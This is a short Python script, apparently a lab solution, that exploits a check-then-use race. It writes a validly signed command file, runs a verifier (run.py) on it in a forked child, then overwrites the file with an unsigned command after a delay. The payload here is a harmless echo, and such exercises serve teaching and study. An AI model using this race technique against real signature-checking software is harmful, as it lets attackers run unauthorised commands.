import json
import os
import time

PATH = "./foo.json"
LEGAL = json.dumps({"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"})
MALICIOUS  = json.dumps({"command": "echo hacked"})

def main(argv):
    
    with open(PATH, 'w') as writer:
        writer.write(LEGAL)
        
    pid = os.fork()
    
    # Child process.
    if pid <= 0: 
        os.system('python3 ./run.py {}'.format(PATH)) #run run.py 
        os._exit(0)
    
    # Parent process.
    else: 
        time.sleep(2) 
        with open(PATH, 'w') as writer:
            writer.write(MALICIOUS) # Overwrite malicious content
        
    os.wait() #wait for child

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
